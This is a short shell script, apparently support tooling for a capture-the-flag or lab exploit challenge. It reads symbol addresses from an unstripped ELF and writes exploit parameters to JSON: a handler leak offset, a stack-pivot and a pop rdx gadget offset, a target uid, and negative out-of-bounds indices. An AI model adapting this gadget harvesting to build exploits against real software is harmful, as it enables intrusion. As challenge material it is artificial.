#!/bin/sh
set -eu

if [ "$#" -ne 2 ]; then
    echo "usage: $0 UNSTRIPPED_ELF OUTPUT_JSON" >&2
    exit 2
fi

binary=$1
output=$2

symbol_hex() {
    nm -an "$binary" | awk -v wanted="$1" '
        $3 == wanted { print $1; found=1; exit }
        END { if (!found) exit 1 }
    '
}

handler=$((0x$(symbol_hex op_halt)))
pivot=$((0x$(symbol_hex vm_restore_frame)))
pop_rdx=$((0x$(symbol_hex vm_restore_operand)))

{
    printf '{\n'
    printf '  "handler_leak_offset": %d,\n' "$handler"
    printf '  "handler_zero_index": -82,\n'
    printf '  "pivot_offset": %d,\n' "$pivot"
    printf '  "pop_rdx_offset": %d,\n' "$pop_rdx"
    printf '  "pwn_uid": 2000,\n'
    printf '  "tape_base_index": -85,\n'
    printf '  "tape_origin_index": -84,\n'
    printf '  "trigger_handler_index": -67,\n'
    printf '  "version": 1\n'
    printf '}\n'
} > "$output"
